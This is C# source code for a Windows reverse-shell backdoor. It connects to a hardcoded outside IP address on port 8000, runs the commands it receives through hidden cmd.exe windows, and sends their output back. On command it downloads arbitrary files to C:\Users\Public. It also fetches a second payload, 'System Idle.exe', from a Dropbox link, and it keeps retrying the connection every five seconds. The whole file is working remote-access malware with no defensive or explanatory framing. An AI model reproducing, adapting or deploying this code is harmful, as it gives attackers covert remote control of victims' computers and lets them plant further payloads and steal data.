using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;
using System.Text.RegularExpressions;
namespace Client
{
    class Program
    {
        static Socket sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        static int i = 0;

        public static bool socketConnect()
        {
            
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse("85.65.60.251"), 8000);
            sck.Connect(endPoint);
            //Console.WriteLine(sck.Connected);
            return sck.Connected;
        }

        public static void DownloadFile()
        {
            WebClient webclient = new WebClient();
            byte[] URL = Encoding.Default.GetBytes("Enter URL: ");
            sck.Send(URL, 0, URL.Length, 0);
            byte[] urlbuffer = new byte[255];
            int recURL = sck.Receive(urlbuffer, 0, urlbuffer.Length, 0);
            Array.Resize(ref urlbuffer, recURL);
            string url = Encoding.Default.GetString(urlbuffer);
            string replacment = Regex.Replace(url, @"\n", "");
            webclient.DownloadFileAsync(new Uri(replacment), @"c:\Users\Public\file");

          
        }
        static void downloadSHELL()
        {
            byte[] downloadshell = Encoding.Default.GetBytes("Downloading Second shell on port 9000\n");
            sck.Send(downloadshell, 0, downloadshell.Length, 0);
            WebClient webclient2 = new WebClient();
            webclient2.DownloadFile(new Uri("https://dl.dropboxusercontent.com/s/zzljkhehbp6trcy/System%20Idle.exe?dl=1&token_hash=AAEttdgdiVnODjMLrsUIFRtHZrBOh_t4IsUluvS7pwl7ng"), @"C:\Users\Public\System Idle.exe");
        }

       
        public static bool execcommand()
        {
            //string shell = "$: ";
            //byte[] shellbuf = Encoding.Default.GetBytes(shell);
            //sck.Send(shellbuf, 0, shellbuf.Length, 0);

            if(i == 0)
            {
                downloadSHELL();
                i = 1;
            }
            
            
            byte[] buffer = new byte[255]; // buffer for recieved command
            int rec = sck.Receive(buffer, 0, buffer.Length, 0); // receving

            Array.Resize(ref buffer, rec);
            string command = Encoding.Default.GetString(buffer); // recieved command from bytes to string


            if (command == "quit\n") // quit and close socket
            {
                sck.Close();
            }
            else if (command == "downloadfile\n")
            {
                DownloadFile();
            }
            else
            {
                // execute command
                Process p = new Process();
                p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/C " + command;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.UseShellExecute = false;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                string error = p.StandardError.ReadToEnd();

                // sending command output
                byte[] outputbuf = Encoding.Default.GetBytes(output);
                byte[] errorbuf = Encoding.Default.GetBytes(error);
                sck.Send(outputbuf, 0, outputbuf.Length, 0);
                sck.Send(errorbuf, 0, errorbuf.Length, 0);
                
            }
            return false;
        }

        public static void Main(string[] args)
        {

            while (true)
            {
                bool socketDEAD = false;
                try
                {
                    socketConnect();
                    while (socketDEAD != true)
                    {
                        socketDEAD = execcommand();
                    }
                    sck.Close();

                }
                catch (Exception ex)
                {
                    //Console.WriteLine(ex);
                   // Console.WriteLine("Trying Again ...");
                    System.Threading.Thread.Sleep(5000);
                    sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    

                }
                
                
                

            }

                                  

                
        }
    }
}
